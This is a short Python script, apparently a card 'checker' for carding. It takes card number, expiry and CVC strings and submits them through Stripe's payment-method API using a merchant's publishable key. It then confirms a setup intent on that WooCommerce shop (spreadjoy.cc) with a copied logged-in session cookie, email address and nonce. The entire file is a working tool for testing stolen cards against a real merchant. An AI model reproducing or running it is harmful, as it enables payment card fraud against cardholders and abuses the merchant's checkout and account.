import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TH&pasted_fields=number&payment_user_agent=stripe.js%2F2ddc5912fa%3B+stripe-js-v3%2F2ddc5912fa%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fspreadjoy.cc&time_on_page=39117&client_attribution_metadata[client_session_id]=NA&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=NA&muid=NA&sid=NA&key=pk_live_51GOSCsBBWTdpGUaJgKV4p0IeEgpanPus7BsoMKsQtxwlkXs96ZfDMnhDzUSPyY1kkGLPsREuwgld0nFwsDMPdaq600toBVavJx&_stripe_version=2024-06-20'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '7eb6cc4c-3a92-420a-90f4-64ec79c3d6720e0d2c',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-01-27%2001%3A39%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fpayment-methods%2F',
	    'sbjs_first_add': 'fd%3D2025-01-27%2001%3A39%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fpayment-methods%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    '__stripe_sid': '80e459a3-0f9a-4807-9669-8aa4e4df6cc3f184e9',
	    'breeze_folder_name': '846d9e2eb7f3e5ad6a8e69a3f374e8bbdcdf7843',
	    'wordpress_logged_in_ec2848058ab4b75ac3ed19717b05f12c': 'rodamuser08%40gmail.com%7C1738114781%7CjNUeEsEfQy2h0THBjVMHIdSHrpUlqEmYPqPmcw1dvGC%7C8038ed9babd681adb0e8381bc84fefdaa285254d0151122525fdaeb26fbb0d8e',
	    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'authority': 'spreadjoy.cc',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=7eb6cc4c-3a92-420a-90f4-64ec79c3d6720e0d2c; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-27%2001%3A39%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2025-01-27%2001%3A39%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=80e459a3-0f9a-4807-9669-8aa4e4df6cc3f184e9; breeze_folder_name=846d9e2eb7f3e5ad6a8e69a3f374e8bbdcdf7843; wordpress_logged_in_ec2848058ab4b75ac3ed19717b05f12c=rodamuser08%40gmail.com%7C1738114781%7CjNUeEsEfQy2h0THBjVMHIdSHrpUlqEmYPqPmcw1dvGC%7C8038ed9babd681adb0e8381bc84fefdaa285254d0151122525fdaeb26fbb0d8e; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fmy-account%2Fadd-payment-method%2F',
	    'origin': 'https://spreadjoy.cc',
	    'referer': 'https://spreadjoy.cc/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
	}
	
	data = {
	    'action': 'create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': pm,
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': 'd601eefbdd',
	}
	
	r2 = requests.post('https://spreadjoy.cc/', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
